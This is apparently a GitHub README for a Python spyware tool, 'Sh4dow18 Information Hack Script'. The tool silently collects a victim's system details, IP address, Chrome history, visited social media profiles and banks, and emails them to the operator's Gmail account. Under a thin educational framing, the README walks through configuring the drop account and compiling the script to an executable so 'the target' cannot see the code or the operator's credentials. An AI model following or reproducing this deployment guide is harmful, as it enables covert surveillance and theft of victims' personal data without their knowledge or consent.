[//]: # (Version 1.0)

# Sh4dow18 Information Hack Script

![SIHS](readme/01_sihs.png)

# Overview

Sh4dow18 Information Hack Script (SIHS) is a script that allows you to see how a cybercriminal
(cracker) could obtain information from the system and then carry out another attack that generates
more damage to the user. This program allows you to steal data relating to the system and browser
history to obtain personal information.

# Version

Version: **1.0**

# What is Python?

![PYTHON](readme/02_python.jpg)

*Python* is an interpreted programming language whose philosophy emphasizes the readability of its
code. It is a multi-paradigm programming language, since it partially supports object-orientation,
imperative programming and functional programming.

# Using SIHS

![LOGO](readme/03_sihs_logo.png)

First, you have to download the repository. To download it, you can download the compressed file
(.zip) or clone the repository, with the “git” program installed, through the CMD in “Windows” or
with a terminal in Linux. This is done in the form (In both cases):

```bash
git clone https://github.com/sh4dow18/sihs.git
```

In Linux in some cases the command “sudo” is needed before the previous command.

Then, the option to allow messages from non-secure applications must be activated in the gmail
account, since gmail recognizes the sending of emails by *Python* as non-secure. You can activate this option with the following google link: Click 
**[Here](https://www.google.com/settings/security/lesssecureapps)**

After, 2 lines of code must be changed for the program to work. The lines that must be changed are
lines 123 and 135. You must enter the email (Have to be a Gmail) and password to which you want the data to be sent.

Later, to be able to share the program without creating suspicions, it must be compiled, because
when passing it as *Python* program, the target can see the code or obtain your credentials and,
therefore, the attack fails.

*Python* is an interpreted language, so it cannot be compiled normally as it is not designed for
that. To compile the file in **Windows**, the attached program "compiler_windows.py" must be
executed in the form:

```console
C:\Users\<usuario>\<ruta>\pip3 install -U py2exe
C:\Users\<usuario>\<ruta>\python compiler_windows.py install
C:\Users\<usuario>\<ruta>\python compiler_windows.py py2exe
```

This will compile the script and create the ".exe".

If the user to be attacked has **Linux**, the "pyinstaller" program must be downloaded with "pip3".

```bash
pip3 install pyinstaller
~/.local/bin/pyinstaller sihs.py
```

Both "compiler_windows.py" and "pyinstaller" leave folders with the files necessary for the binary
files to work. In the case of "compiler_windows.py", leaves the necessary folder directly, while
"pyinstaller" leaves 2 folders, the necessary folder is "dist/sihs/".

Automatically when the program is executed it will not show anything on the screen, however it will send the email with the data.

# Do you want to know more? READ THIS

![KNOW](readme/04_know_more.png)

The program at startup uses the result of functions within variables, such as the variables
"what_system", "what_platform", "user" and "host". The other variables obtain the information
through a function within the script.

To obtain the IP address, what is done is to obtain the information of the connection with the
*Google* address through a socket.

To obtain the user's path, the system where the program is being executed is verified and with this
the default paths are set. On **Windows** it is "C:\\Users\\" and on **Linux** it is "/home/".

Chrome's history is obtained from the "sqlite3" library. History is first located through its default
path on both **Windows** and **Linux**. Then a Temporary History is created with "copyfile" so that
the history can be accessed even if *Google Chrome* is open. Later, since Chrome's history is
actually a SQL-type database, it can be accessed and manipulated with the "sqlite3" library, where
it is asked to return all existing urls.

In order to obtain *YouTube* channels, *Facebook* profiles and also the visited *Twitter* profiles,
regular expressions are used according to the urls standard used by each platform. The results are
then saved within arrays.

The name of the banks you visited is obtained by means of the name of the banks, what the program
does is to verify if these banks are found in the history.

Subsequently, a text file with the name "information" is created, where all the information
collected by the program is saved. This calls a function called "AddingInformation" that formats
the arrays to be added into the file.

Finally, the file is sent by email, thanks to the "smptlib" library that handles the "Simple Mail
Transfer Protocol" (SMTP). The file is sent with another name, it is sent with the name of the user
followed by the name of the machine, so that it is better identified from which machine that
information comes.

In addition, the Python file compiler for Windows has the py2exe library that will create the executable ".exe" by means of the "system" function of "distutils.core".

That's all the documentation for now. Eat vegetables and have a good day.
